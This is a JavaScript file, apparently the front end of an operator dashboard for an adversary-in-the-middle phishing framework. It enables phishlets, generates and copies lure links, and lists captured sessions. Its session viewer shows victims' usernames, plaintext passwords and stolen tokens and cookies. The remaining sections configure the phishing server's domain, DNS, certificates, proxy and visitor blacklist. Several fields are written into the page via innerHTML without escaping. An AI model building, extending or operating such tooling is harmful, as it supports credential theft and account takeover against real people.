const API_BASE = '/api';

// Navigation
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));

        btn.classList.add('active');
        const tab = btn.dataset.tab;
        document.getElementById(`${tab}-view`).classList.add('active');

        loadView(tab);
        window.location.hash = tab;
        closeSidebar();
    });
});

// Mobile Menu Toggle
const sidebar = document.querySelector('.sidebar');
const overlay = document.getElementById('sidebar-overlay');
const menuToggle = document.getElementById('menu-toggle');

function toggleSidebar() {
    sidebar.classList.toggle('active');
    overlay.classList.toggle('active');
}

function closeSidebar() {
    sidebar.classList.remove('active');
    overlay.classList.remove('active');
}

if (menuToggle) {
    menuToggle.addEventListener('click', toggleSidebar);
}

if (overlay) {
    overlay.addEventListener('click', closeSidebar);
}

// Handle browser back/forward and initial load
window.addEventListener('load', () => handleHashChange());
window.addEventListener('hashchange', () => handleHashChange());

function handleHashChange() {
    const hash = window.location.hash.substring(1);
    if (hash) {
        const btn = document.querySelector(`.nav-btn[data-tab="${hash}"]`);
        if (btn) btn.click();
    }
}

function loadView(tab) {
    switch (tab) {
        case 'dashboard':
            refreshStats();
            break;
        case 'phishlets':
            refreshPhishlets();
            break;
        case 'sessions':
            refreshSessions();
            break;
        case 'lures':
            refreshLures();
            fetchPhishletNames(); // For the create lure dropdown
            break;
        case 'blacklist':
            refreshBlacklist();
            break;
        case 'config':
            refreshConfig();
            break;
    }
}

// Initial Load
loadView('dashboard');
setInterval(refreshStats, 30000); // Refresh stats every 30s

async function fetchAPI(endpoint, options = {}) {
    try {
        const response = await fetch(`${API_BASE}${endpoint}`, options);
        if (response.status === 401) {
            showToast('Unauthorized. Please refresh and log in.', 'error');
            return null;
        }

        const data = await response.json().catch(() => null);

        if (!response.ok) {
            const errorMsg = data && data.error ? data.error : `API Error: ${response.statusText}`;
            showToast(errorMsg, 'error');
            return null;
        }

        // Show success message if present (optional, or rely on caller)
        if (data && data.status) {
            // Maybe too noisy for "status" messages?
            // Let's only toast explicitly if we want feedback for actions.
            // But for now error handling is priority.
        }

        return data;
    } catch (error) {
        console.error(error);
        showToast('Network error or server unreachable.', 'error');
        return null;
    }
}

function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <span>${message}</span>
        <span style="cursor:pointer; margin-left: 10px;" onclick="this.parentElement.remove()">&times;</span>
    `;

    container.appendChild(toast);

    // Auto remove after 5 seconds
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s ease forwards';
        setTimeout(() => toast.remove(), 300);
    }, 5000);
}

// Pagination State
const PAGE_SIZE = 20;
const paginationState = {
    phishlets: 1,
    sessions: 1,
    lures: 1,
    blacklist: 1
};

function renderPagination(containerId, totalItems, currentPage, onPageChange) {
    const container = document.getElementById(containerId);
    if (!container) return;

    const totalPages = Math.ceil(totalItems / PAGE_SIZE) || 1;
    container.innerHTML = `
        <button class="pagination-btn" ${currentPage === 1 ? 'disabled' : ''} id="${containerId}-prev">Prev</button>
        <span class="page-info">Page ${currentPage} of ${totalPages}</span>
        <button class="pagination-btn" ${currentPage === totalPages ? 'disabled' : ''} id="${containerId}-next">Next</button>
    `;

    container.querySelector(`#${containerId}-prev`).addEventListener('click', () => onPageChange(currentPage - 1));
    container.querySelector(`#${containerId}-next`).addEventListener('click', () => onPageChange(currentPage + 1));
}

// Stats
async function refreshStats() {
    const status = await fetchAPI('/status');
    if (status) {
        document.getElementById('stats-phishlets').innerText = status.active_phishlets;
        document.getElementById('stats-sessions').innerText = status.sessions_count;
        document.getElementById('stats-lures').innerText = status.lures_count || 0;
        document.getElementById('stats-blacklist').innerText = status.blacklist_count || 0;

        document.getElementById('dashboard-domain').innerText = status.domain || '-';
        document.getElementById('dashboard-ip').innerText = status.external_ip || '-';

        const tbody = document.querySelector('#recent-sessions-table tbody');
        if (tbody && status.recent_sessions) {
            tbody.innerHTML = '';
            status.recent_sessions.forEach(s => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${s.id}</td>
                    <td>${s.phishlet}</td>
                    <td>${s.username || '-'}</td>
                    <td>${new Date(s.time * 1000).toLocaleString()}</td>
                `;
                tbody.appendChild(tr);
            });
        }
    }
}

// Phishlets
async function refreshPhishlets() {
    const data = await fetchAPI('/phishlets');
    const tbody = document.querySelector('#phishlets-table tbody');
    tbody.innerHTML = '';

    if (data && data.phishlets) {
        const total = data.phishlets.length;
        const start = (paginationState.phishlets - 1) * PAGE_SIZE;
        const end = start + PAGE_SIZE;
        const pageData = data.phishlets.slice(start, end);

        pageData.forEach(p => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td><strong>${p.name}</strong></td>
                <td><span class="status-badge" style="background-color: ${p.enabled ? 'rgba(3, 218, 198, 0.15)' : 'rgba(207, 102, 121, 0.15)'}; color: ${p.enabled ? 'var(--success-color)' : 'var(--danger-color)'}">${p.enabled ? 'Active' : 'Disabled'}</span></td>
                <td>${p.hostname || '<span style="color:var(--text-secondary)">Not Set</span>'}</td>
                <td>
                    ${p.enabled ?
                    `<button class="btn-danger" onclick="togglePhishlet('${p.name}', false)">Disable</button>` :
                    `<button class="btn-primary" onclick="togglePhishlet('${p.name}', true)">Enable</button>`
                }
                </td>
            `;
            tbody.appendChild(tr);
        });

        renderPagination('phishlets-pagination', total, paginationState.phishlets, (newPage) => {
            paginationState.phishlets = newPage;
            refreshPhishlets();
        });
    }
}

async function togglePhishlet(name, enable) {
    const action = enable ? 'enable' : 'disable';
    await fetchAPI(`/phishlets/${name}/${action}`, { method: 'POST' });
    refreshPhishlets();
}

async function fetchPhishletNames() {
    const data = await fetchAPI('/phishlets');
    const select = document.getElementById('lure-phishlet-select');
    select.innerHTML = '<option value="">Select Phishlet</option>';
    if (data && data.phishlets) {
        data.phishlets.forEach(p => {
            const option = document.createElement('option');
            option.value = p.name;
            option.innerText = p.name;
            select.appendChild(option);
        });
    }
}

// Sessions
async function refreshSessions() {
    const data = await fetchAPI('/sessions');
    const tbody = document.querySelector('#sessions-table tbody');
    tbody.innerHTML = '';

    if (data && data.sessions) {
        const total = data.sessions.length;
        const start = (paginationState.sessions - 1) * PAGE_SIZE;
        const end = start + PAGE_SIZE;
        const pageData = data.sessions.slice(start, end);

        pageData.forEach(s => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${s.id}</td>
                <td>${s.phishlet}</td>
                <td>${s.username || '-'}</td>
                <td>${s.password ? '******' : '-'}</td>
                <td>${Object.keys(s.tokens || {}).length > 0 ? '✔️' : '❌'}</td>
                <td>${s.remote_ip}</td>
                <td>${new Date(s.time * 1000).toLocaleString()}</td>
                <td>
                    <button class="btn-primary" style="padding:0.3rem 0.6rem; font-size: 0.8rem;" onclick="viewSession(${s.id})">View</button>
                    <button class="btn-danger" style="padding:0.3rem 0.6rem; font-size: 0.8rem;" onclick="deleteSession(${s.id})">Del</button>
                </td>
            `;
            tbody.appendChild(tr);
        });

        renderPagination('sessions-pagination', total, paginationState.sessions, (newPage) => {
            paginationState.sessions = newPage;
            refreshSessions();
        });
    }
}

async function deleteSession(id) {
    if (confirm('Are you sure?')) {
        await fetchAPI(`/sessions/${id}`, { method: 'DELETE' });
        refreshSessions();
    }
}

async function viewSession(id) {
    const s = await fetchAPI(`/sessions/${id}`);
    if (s) {
        const modal = document.getElementById('modal-overlay');
        const content = document.getElementById('modal-content');

        let tokensHtml = '';
        if (s.tokens) {
            tokensHtml = `<pre>${JSON.stringify(s.tokens, null, 2)}</pre>`;
        } else {
            tokensHtml = 'No tokens captured.';
        }

        content.innerHTML = `
            <h2>Session #${s.id}</h2>
            <div style="margin-top: 1rem;">
                <p><strong>Phishlet:</strong> ${s.phishlet}</p>
                <p><strong>Username:</strong> ${s.username}</p>
                <p><strong>Password:</strong> ${s.password}</p>
                <p><strong>Landing URL:</strong> ${s.landing_url}</p>
                <p><strong>User Agent:</strong> ${s.user_agent}</p>
                <h3 style="margin-top: 1rem;">Tokens/Cookies</h3>
                <div style="background:var(--bg-dark); padding:1rem; border-radius:6px; overflow:auto; max-height: 200px;">
                    ${tokensHtml}
                </div>
            </div>
        `;
        modal.style.display = 'flex';
    }
}

function closeModal() {
    document.getElementById('modal-overlay').style.display = 'none';
}

// Lures
async function refreshLures() {
    const data = await fetchAPI('/lures');
    const tbody = document.querySelector('#lures-table tbody');
    tbody.innerHTML = '';

    if (data && data.lures) {
        const total = data.lures.length;
        const start = (paginationState.lures - 1) * PAGE_SIZE;
        const end = start + PAGE_SIZE;
        const pageData = data.lures.slice(start, end);

        pageData.forEach(l => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${l.id}</td>
                <td>${l.phishlet}</td>
                <td>${l.path}</td>
                <td><a href="${l.url}" target="_blank" style="color:var(--accent-color)">${l.url}</a></td>
                <td>
                     <button class="btn-primary" style="padding:0.3rem 0.6rem; font-size: 0.8rem;" onclick="copyToClipboard('${l.url}')">Copy</button>
                </td>
            `;
            tbody.appendChild(tr);
        });

        renderPagination('lures-pagination', total, paginationState.lures, (newPage) => {
            paginationState.lures = newPage;
            refreshLures();
        });
    }
}

async function createLure() {
    const select = document.getElementById('lure-phishlet-select');
    const phishlet = select.value;
    if (!phishlet) return showToast('Select a phishlet', 'error');

    await fetchAPI('/lures', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phishlet: phishlet })
    });
    refreshLures();
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied to clipboard!', 'success');
}

// Blacklist
async function refreshBlacklist() {
    const data = await fetchAPI('/blacklist');
    const tbody = document.querySelector('#blacklist-table tbody');
    tbody.innerHTML = '';

    if (data && data.blacklist) {
        const total = data.blacklist.length;
        const start = (paginationState.blacklist - 1) * PAGE_SIZE;
        const end = start + PAGE_SIZE;
        const pageData = data.blacklist.slice(start, end);

        pageData.forEach(ip => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${ip.ip}</td>
                <td><button class="btn-danger" onclick="removeBlacklist('${ip.ip}')">Remove</button></td>
            `;
            tbody.appendChild(tr);
        });

        renderPagination('blacklist-pagination', total, paginationState.blacklist, (newPage) => {
            paginationState.blacklist = newPage;
            refreshBlacklist();
        });
    }
}

async function addBlacklist() {
    const input = document.getElementById('blacklist-ip');
    const ip = input.value;
    if (!ip) return;

    await fetchAPI('/blacklist', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ip, action: 'add' })
    });
    input.value = '';
    refreshBlacklist();
}

async function removeBlacklist(ip) {
    await fetchAPI('/blacklist', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ip, action: 'remove' })
    });
    refreshBlacklist();
}

// Config
async function refreshConfig() {
    const data = await fetchAPI('/config');
    if (data) {
        // Populate Form
        if (data.config) {
            document.getElementById('cfg-domain').value = data.config.domain;
            document.getElementById('cfg-ext-ip').value = data.config.external_ipv4;
            document.getElementById('cfg-bind-ip').value = data.config.bind_ipv4;
            document.getElementById('cfg-unauth-url').value = data.config.unauth_url;
            document.getElementById('cfg-https-port').value = data.config.https_port;
            document.getElementById('cfg-dns-port').value = data.config.dns_port;
            document.getElementById('cfg-autocert').checked = data.config.autocert;
        }

        if (data.proxy) {
            document.getElementById('proxy-enabled').checked = data.proxy.enabled;
            document.getElementById('proxy-type').value = data.proxy.type;
            document.getElementById('proxy-address').value = data.proxy.address;
            document.getElementById('proxy-port').value = data.proxy.port;
            document.getElementById('proxy-user').value = data.proxy.username;
            document.getElementById('proxy-pass').value = data.proxy.password;
        }
    }
}

async function saveConfig() {
    const config = {
        domain: document.getElementById('cfg-domain').value,
        external_ipv4: document.getElementById('cfg-ext-ip').value,
        bind_ipv4: document.getElementById('cfg-bind-ip').value,
        unauth_url: document.getElementById('cfg-unauth-url').value,
        https_port: parseInt(document.getElementById('cfg-https-port').value),
        dns_port: parseInt(document.getElementById('cfg-dns-port').value),
        autocert: document.getElementById('cfg-autocert').checked
    };

    await fetchAPI('/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
    });
    showToast('Configuration saved! Restart required for some changes.', 'success');
}

async function runTestCerts() {
    showToast('Starting certificate test/setup... this may take up to 60s', 'info');
    const res = await fetchAPI('/test-certs', { method: 'POST' });
    if (res && res.status === 'ok') {
        showToast('Certificate setup completed successfully!', 'success');
    } else {
        // If fetchAPI returns null or error it handles the toast, but maybe we want specific handling
    }
}

async function saveProxy() {
    const config = {
        enabled: document.getElementById('proxy-enabled').checked,
        type: document.getElementById('proxy-type').value,
        address: document.getElementById('proxy-address').value,
        port: parseInt(document.getElementById('proxy-port').value),
        username: document.getElementById('proxy-user').value,
        password: document.getElementById('proxy-pass').value,
    };

    await fetchAPI('/proxy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
    });
    showToast('Proxy settings saved! Restart required to take full effect.', 'success');
}
